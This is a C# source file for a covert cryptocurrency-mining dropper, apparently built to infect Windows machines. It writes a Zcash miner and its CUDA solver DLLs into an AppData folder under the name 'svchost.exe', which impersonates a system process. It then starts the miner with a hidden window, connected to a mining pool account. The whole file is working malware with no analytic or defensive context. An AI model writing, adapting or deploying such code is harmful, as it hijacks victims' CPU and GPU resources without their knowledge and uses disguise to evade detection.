using System;
using System.Diagnostics;
using System.IO;

namespace Wininit
{
    static class Program
    {
        /// <summary>
        /// Ponto de entrada principal para o aplicativo.
        /// </summary>
        [STAThread]
        static void Main()
        {
            string dir = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\svchost\\";

            if (!Directory.Exists(dir))
            {
                Directory.CreateDirectory(dir);
            }

            string svchost = dir + "svchost.exe";
            File.WriteAllBytes(svchost, Wininit.Properties.Resources.svchost);

            string cpu_tromp_AVX = dir + "cpu_tromp_AVX.dll";
            File.WriteAllBytes(cpu_tromp_AVX, Wininit.Properties.Resources.cpu_tromp_AVX);

            string cpu_tromp_SSE2 = dir + "cpu_tromp_SSE2.dll";
            File.WriteAllBytes(cpu_tromp_SSE2, Wininit.Properties.Resources.cpu_tromp_SSE2);

            string cuda_djezo = dir + "cuda_djezo.dll";
            File.WriteAllBytes(cuda_djezo, Wininit.Properties.Resources.cuda_djezo);

            string cuda_tromp = dir + "cuda_tromp.dll";
            File.WriteAllBytes(cuda_tromp, Wininit.Properties.Resources.cuda_tromp);

            string cuda_tromp_75 = dir + "cuda_tromp_75.dll";
            File.WriteAllBytes(cuda_tromp_75, Wininit.Properties.Resources.cuda_tromp_75);

            string cudart32_75 = dir + "cudart32_75.dll";
            File.WriteAllBytes(cudart32_75, Wininit.Properties.Resources.cudart32_75);

            string cudart32_80 = dir + "cudart32_80.dll";
            File.WriteAllBytes(cudart32_80, Wininit.Properties.Resources.cudart32_80);

            string cudart64_75 = dir + "cudart64_75.dll";
            File.WriteAllBytes(cudart64_75, Wininit.Properties.Resources.cudart64_75);

            string cudart64_80 = dir + "cudart64_80.dll";
            File.WriteAllBytes(cudart64_80, Wininit.Properties.Resources.cudart64_80);

            ProcessStartInfo client = new ProcessStartInfo(svchost);
            client.WindowStyle = ProcessWindowStyle.Hidden;
            client.CreateNoWindow = true;
            client.Arguments = "-l zec-us.suprnova.cc:2142 -u thesuperminer.1 -p theworkerpass -t 4";

            Process clientProcess = Process.Start(client);
        }
    }
}
